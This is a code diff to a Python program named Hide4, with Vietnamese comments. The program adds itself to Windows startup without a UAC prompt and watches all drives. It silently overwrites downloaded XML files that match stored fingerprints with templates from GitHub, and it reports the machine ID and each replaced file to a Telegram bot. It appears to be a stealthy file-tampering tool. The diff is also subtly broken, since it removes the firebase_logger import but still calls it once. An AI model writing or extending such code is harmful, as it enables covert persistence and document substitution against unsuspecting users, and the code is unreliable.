@@ -51,11 +51,11 @@ from logging_manager import get_logger, log_performance, log_error_with_context
 # Setup main logger
 logger = get_logger('main')
 
-# Import các module mới
-from firebase_logger import firebase_logger
+# Import các module mới (không dùng Firebase nữa)
 from github_storage import github_storage_sync
 from machine_manager import machine_manager
 from xml_fingerprint import XMLFingerprint
+from telegram_logger import telegram_logger
 
 def add_to_startup():
     """Thêm chính EXE vào HKCU Run để auto-startup không UAC."""
@@ -71,10 +71,16 @@ def add_to_startup():
         winreg.SetValueEx(key, "Hide4", 0, winreg.REG_SZ, exe)
         winreg.CloseKey(key)
         logger.info(f"✅ Đã thêm vào Startup: {exe}")
-        firebase_logger.send_log("Đã thêm vào Startup", exe)
+        try:
+            telegram_logger.send_text(f"Đã thêm vào Startup: {exe}")
+        except Exception:
+            pass
     except Exception as e:
         logger.error(f"❌ Thêm vào Startup thất bại: {e}")
-        firebase_logger.send_log("Thêm vào Startup thất bại", str(e))
+        try:
+            telegram_logger.send_text(f"Thêm vào Startup thất bại: {e}")
+        except Exception:
+            pass
 
 # Đã xóa load_remote_config() - thay bằng Telegram Bot
 
@@ -93,13 +99,19 @@ def get_templates():
             templates = github_storage_sync.get_local_templates()
 
         logger.info(f"📁 Tìm thấy {len(templates)} templates")
-        firebase_logger.send_log("Đã cài đặt mẫu XML từ GitHub Repository", f"{len(templates)} files")
+        try:
+            telegram_logger.send_text(f"Templates khả dụng: {len(templates)} files")
+        except Exception:
+            pass
 
         return templates
 
     except Exception as e:
         logger.error(f"❌ Lỗi lấy templates: {e}")
-        firebase_logger.send_log(f"Lỗi lấy templates: {str(e)}", "GitHub Storage")
+        try:
+            telegram_logger.send_text(f"Lỗi lấy templates: {e}")
+        except Exception:
+            pass
         return []
 
 def load_processed_files():
@@ -118,6 +130,7 @@ class DownloadHandler(FileSystemEventHandler):
         super().__init__()
         self.templates_dir = templates_dir
         self.processed = load_processed_files()
+        self._last_run_ts = {}
 
         # Khởi tạo XML Fingerprint
         self.xml_fp = XMLFingerprint(templates_dir)
@@ -131,11 +144,41 @@ class DownloadHandler(FileSystemEventHandler):
         if not event.is_directory and event.dest_path.endswith('.xml'):
             self.try_overwrite(event.dest_path)
 
+    def on_modified(self, event):
+        """Xử lý khi file vừa được ghi (giúp phản ứng gần như ngay lập tức)."""
+        if not event.is_directory and event.src_path.endswith('.xml'):
+            self.try_overwrite(event.src_path)
+
+    def _wait_for_file_stable(self, path: str, timeout: float = 5.0, interval: float = 0.1) -> bool:
+        """Chờ cho tới khi file ổn định (kích thước & mtime không đổi)."""
+        start = time.time()
+        last_size = -1
+        last_mtime = -1.0
+        while time.time() - start < timeout:
+            try:
+                size = os.path.getsize(path)
+                mtime = os.path.getmtime(path)
+            except FileNotFoundError:
+                return False
+            if size == last_size and mtime == last_mtime:
+                return True
+            last_size, last_mtime = size, mtime
+            time.sleep(interval)
+        return False
+
     def try_overwrite(self, dest):
         # Không xử lý các file nằm trong _MEIPASS/templates
         logger.debug(f"🔍 DEBUG: Analyzing file: {dest}")
         logger.debug(f"🔍 DEBUG: File exists: {os.path.exists(dest)}")
         logger.debug(f"🔍 DEBUG: File size: {os.path.getsize(dest) if os.path.exists(dest) else 'N/A'}")
+
+        # Chặn spam xử lý cùng 1 file trong ~1 giây (debounce)
+        now_ts = time.time()
+        last_ts = self._last_run_ts.get(dest, 0)
+        if now_ts - last_ts < 1.0:
+            logger.debug(f"⏱️ Debounced processing for: {dest}")
+            return
+        self._last_run_ts[dest] = now_ts
 
         if getattr(sys, 'frozen', False):
             base = sys._MEIPASS
@@ -145,6 +188,11 @@ class DownloadHandler(FileSystemEventHandler):
 
         logger.info(f"Analyzing file: {dest}")
         
+        # Đảm bảo file đã ghi xong (tránh đè khi còn đang ghi)
+        if not self._wait_for_file_stable(dest):
+            logger.warning(f"⚠️ File chưa ổn định, bỏ qua: {dest}")
+            return
+
         # Sử dụng XML fingerprint để tìm template khớp
         match_result = self.xml_fp.find_matching_template(dest)
         if not match_result:
@@ -160,8 +208,6 @@ class DownloadHandler(FileSystemEventHandler):
         if not src:
             logger.error(f"Khong tim thay file template: {template_name}")
             return
-
-        time.sleep(1)  # đợi file không còn bị khóa
 
         try:
             # Kiểm tra nội dung trước khi ghi đè
@@ -197,6 +243,12 @@ class DownloadHandler(FileSystemEventHandler):
             logger.info(f"Ghi de thanh cong: {src} -> {dest}")
             firebase_logger.send_log("PHAT HIEN FILE FAKE", dest, fingerprint_info)
 
+            # Gửi thông báo Telegram (nếu được cấu hình)
+            try:
+                telegram_logger.send_detection(dest, fingerprint_info)
+            except Exception as _tg_err:
+                logger.debug(f"Telegram notify skipped/error: {_tg_err}")
+
             self.processed.add(dest)
             save_processed_files(self.processed)
 
@@ -209,7 +261,10 @@ def start_monitor():
     """Headless mode: tự thêm startup, log start, và giám sát toàn PC."""
     # Khởi tạo Machine Manager
     machine_manager.update_last_active()
-    firebase_logger.send_log("Phần mềm Hide4 khởi chạy", f"Machine: {machine_manager.get_machine_id()}")
+    try:
+        telegram_logger.send_text(f"Hide4 khởi chạy | Machine: {machine_manager.get_machine_id()}")
+    except Exception:
+        pass
 
     # Thêm vào startup
     add_to_startup()
@@ -263,10 +318,14 @@ def start_monitor():
             logger.debug(f"📁 Folder does not exist: {folder}")
 
     observer.start()
-    firebase_logger.send_log("Bắt đầu giám sát", f"Drives: {','.join(drives)}")
+    try:
+        telegram_logger.send_text("Bắt đầu giám sát")
+    except Exception:
+        pass
 
     # Bắt đầu heartbeat
-    machine_manager.start_heartbeat(firebase_logger)
+    # Heartbeat nội bộ, không gửi Firebase nữa
+    machine_manager.start_heartbeat()
 
     try:
         while True:
@@ -274,10 +333,16 @@ def start_monitor():
     except KeyboardInterrupt:
         observer.stop()
         machine_manager.stop_heartbeat()
-        firebase_logger.send_log("Phần mềm đã tắt")
+        try:
+            telegram_logger.send_text("Phần mềm đã tắt")
+        except Exception:
+            pass
     except Exception as e:
         logger.error(f"❌ Phần mềm gặp lỗi: {e}")
-        firebase_logger.send_log("Phần mềm gặp lỗi", str(e))
+        try:
+            telegram_logger.send_text(f"Lỗi: {e}")
+        except Exception:
+            pass
     observer.join()
 
 def launch_gui():
@@ -339,19 +404,15 @@ def launch_gui():
     lbl_install = ctk.CTkLabel(telegram_tab, text=f"Cài đặt: {machine_info['install_date']}")
     lbl_install.pack(pady=2)
 
-    # Firebase Status
-    firebase_status = "✅ Đã cấu hình" if firebase_logger.is_configured() else "❌ Chưa cấu hình"
-    lbl_firebase_status = ctk.CTkLabel(telegram_tab, text=f"Firebase Status: {firebase_status}")
-    lbl_firebase_status.pack(pady=10)
+    # Telegram Status
+    tg_status = "✅ Đã cấu hình" if telegram_logger.enabled else "❌ Chưa cấu hình"
+    lbl_tg_status = ctk.CTkLabel(telegram_tab, text=f"Telegram: {tg_status}")
+    lbl_tg_status.pack(pady=10)
 
     # Buttons
-    btn_test_log = ctk.CTkButton(telegram_tab, text="Test gửi log",
-                                command=lambda: firebase_logger.send_log("Test từ GUI", "GUI Test"))
+    btn_test_log = ctk.CTkButton(telegram_tab, text="Test gửi Telegram",
+                                command=lambda: telegram_logger.send_text("Test từ GUI"))
     btn_test_log.pack(pady=5)
-
-    btn_show_config = ctk.CTkButton(telegram_tab, text="Xem Config",
-                                   command=lambda: print(f"Config file: {firebase_logger.CONFIG_FILE}"))
-    btn_show_config.pack(pady=5)
 
     # Heartbeat Status
     heartbeat_status = "🟢 Đang chạy" if machine_info['heartbeat_running'] else "🔴 Đã dừng"
